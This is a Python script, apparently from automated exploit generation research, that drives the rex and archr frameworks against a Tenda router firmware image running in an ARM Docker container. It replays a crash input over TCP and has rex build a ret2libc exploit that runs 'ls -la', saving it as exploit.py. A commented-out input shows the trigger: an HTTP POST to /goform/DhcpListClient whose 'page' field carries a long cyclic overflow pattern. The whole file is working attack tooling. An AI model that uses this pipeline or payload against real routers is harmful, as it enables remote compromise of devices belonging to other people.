import os
import time
import pickle
import logging

import rex
import archr
from rex.exploit.actions import RexOpenChannelAction, RexSendAction, RexCloseChannelAction, RexWaitAction
from rex.enums import CrashInputType

logging.getLogger('angr.exploration_techniques.tracer').setLevel(logging.DEBUG)
logging.getLogger('rex').setLevel(logging.DEBUG)
logging.getLogger('pyvex.lifting.gym.arm_spotter').setLevel(logging.ERROR)
logging.getLogger('archr.analyzers.qemu_tracer').setLevel(logging.DEBUG)
#logging.getLogger('angrop.gadget_analyzer').setLevel(logging.DEBUG)
logging.getLogger('angrop.chain_builder').setLevel(logging.DEBUG)
logging.getLogger("rex.exploit.techniques.ret2libc").setLevel(logging.DEBUG)
logging.getLogger('archr.target.flight').setLevel(logging.DEBUG)
logging.getLogger('archr.target.actions').setLevel(logging.DEBUG)

# initialization
with open('./pre_fire_input', 'rb') as f:
    pre_inp = f.read()
with open('./crash_input', 'rb') as f:
    inp = f.read()
#pre_inp = b'GET /main.html HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n'
#inp = b'POST /goform/DhcpListClient HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nCookie: csrftoken=aaa; password=bbb\r\nContent-Length: 527\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nLISTLEN=1&page=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf'


wait_act1 = RexWaitAction(5)
open_act1 = RexOpenChannelAction()
send_act1 = RexSendAction(pre_inp)
close_act = RexCloseChannelAction()
wait_act2 = RexWaitAction(1)
open_act2 = RexOpenChannelAction()
send_act2 = RexSendAction(inp)
wait_act3 = RexWaitAction(1)
actions = [wait_act1, open_act1, send_act1, close_act, wait_act2, open_act2, send_act2, wait_act3]

# REXing!
with archr.targets.DockerImageTarget("tenda", target_arch='arm', target_os='linux').build().start() as target:
    crash = rex.Crash(target, crash=None, use_crash_input=True, input_type=CrashInputType.TCP, trace_mode="dumb", aslr=False, actions=actions)

    # generate exploits
    factory = crash.exploit(cmd=b"ls -la")
    print(factory.arsenal)
    exp = factory.arsenal['ret2libc']
    exp._concretize_input()
    exp.script("exploit.py")
    print("Done! Horay!")
    print("The exploit is saved as 'exploit.py'")

    #import IPython; IPython.embed()
